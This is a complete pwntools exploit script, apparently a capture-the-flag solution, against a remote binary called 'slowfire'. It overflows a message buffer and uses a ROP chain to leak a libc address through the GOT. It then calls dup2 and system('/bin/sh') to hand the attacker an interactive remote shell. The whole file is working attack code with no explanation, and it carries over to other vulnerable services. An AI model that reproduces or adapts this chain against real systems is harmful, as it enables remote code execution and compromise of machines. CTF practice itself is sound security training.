from pwn import *


elf = ELF("./slowfire")
libc = ELF("./libc6_2.23-0ubuntu11_amd64.so")
#libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
pop_rdi_ret = 0x000000000040170b
pop_rsi_pop_r15_ret = 0x0000000000401709
ret = 0x0000000000401016


context.arch = "amd64"
context.os = "linux"
context.log_level = "info"
#sock = remote("localhost", 4141)
sock = remote("node4.buuoj.cn", 25421)



def leak_libc_base():
    global libc_base_addr
    sock.sendafter(b"Enter your name> ",b"A"*0x40)
    msg_inv = b"C"*8+b"\x00"
    msg_inv += b"B" * (0x438 - len(msg_inv))
    msg_inv += p64(pop_rsi_pop_r15_ret)
    msg_inv += p64(elf.got["read"])
    msg_inv += p64(0)
    msg_inv += p64(elf.plt["write"])
    msg_inv += p64(elf.sym["handle_client"])

    sock.sendafter(b"Enter message> ",msg_inv)
    sleep(0.5)
    print(sock.recvuntil(b"Your converted message is:\n"))
    _ = sock.recv(8)
    leak_addr = u64(sock.recv(8))
    libc_base_addr = leak_addr - libc.sym["read"]
    log.info("libc_base_addr = " + hex(libc_base_addr))

def attack():
    sock.sendafter(b"Enter your name> ",b"/bin/sh\x00\n")
    msg_inv = b"C"*8+b"\x00"
    msg_inv += b"B" * (0x438 - len(msg_inv))

    # dup2(rdi, 0)
    msg_inv += p64(pop_rsi_pop_r15_ret)
    msg_inv += p64(0)
    msg_inv += p64(0)
    msg_inv += p64(libc_base_addr + libc.sym["dup2"])
    # dup2(rdi, 1)
    msg_inv += p64(pop_rsi_pop_r15_ret)
    msg_inv += p64(1)
    msg_inv += p64(0)
    msg_inv += p64(libc_base_addr + libc.sym["dup2"])
    # system(&"/bin/sh")
    msg_inv += p64(pop_rdi_ret)
    msg_inv += p64(elf.sym["name"])
    msg_inv += p64(libc_base_addr + libc.sym["system"])


    sock.sendafter(b"Enter message> ",msg_inv)

leak_libc_base()
attack()

sock.interactive()
